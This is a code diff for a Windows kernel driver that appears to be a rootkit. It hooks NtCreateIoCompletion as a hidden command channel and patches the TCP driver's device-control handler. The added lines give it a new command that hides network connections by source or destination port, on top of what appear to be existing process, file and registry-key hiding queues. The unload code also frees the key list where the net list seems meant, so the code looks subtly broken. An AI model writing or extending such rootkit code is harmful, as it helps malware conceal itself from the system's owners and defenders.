@@ -120,9 +120,10 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     InitializeListHead(&glTaskQueueKey);
     //
 
-  
-
-
+    // Init task list for net
+    ExInitializePagedLookasideList(&glPagedTaskQueueNet, NULL, NULL, 0, sizeof(TASK_QUEUE_NET), ' LFO', 0);
+    InitializeListHead(&glTaskQueueNet);
+    //
 
     dob->DriverUnload = DriverUnload;
     return STATUS_SUCCESS;
@@ -157,7 +158,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     }
     FreeListQueueFilename();
     ExDeletePagedLookasideList(&glPagedTaskQueueFile);
-    while (SyscallProcessedCount);
+    while(SyscallProcessedCount);
     //
 
     //free list for add key
@@ -165,6 +166,10 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     ExDeletePagedLookasideList(&glPagedTaskQueueKey);
     //
 
+    //free list for net
+    FreeTaskQueueKeyList();
+    ExDeletePagedLookasideList(&glPagedTaskQueueNet);
+    //
 
     if (glRealIrpMjDeviceControl) {
         pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = glRealIrpMjDeviceControl;
@@ -224,12 +229,22 @@ ULONG_PTR HookNtCreateIoCompletion(
 
             }
         }
+        else if (pCmd->flags & COMMAND_HIDE_NET) {
+            DbgPrint("Hide network\n");
+            if (pCmd->flags & COMMAND_BUFFER_SRC_PORT) {
+                TaskQueueByNet((ULONG)pCmd->target, TRUE);
+            }
+            else if (pCmd->flags & COMMAND_BUFFER_DST_PORT) {
+                TaskQueueByNet((ULONG)pCmd->target, FALSE);
+            }
+        }
         else {
             DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
         }
         //PrintTaskQueueProcessList();
         //PrintTaskQueueFileList();
         //PrintTaskQueueKeyList();
+        PrintTaskQueueNetList();
     }
     else {
         retStatus = glRealNtCreateIoCompletion(
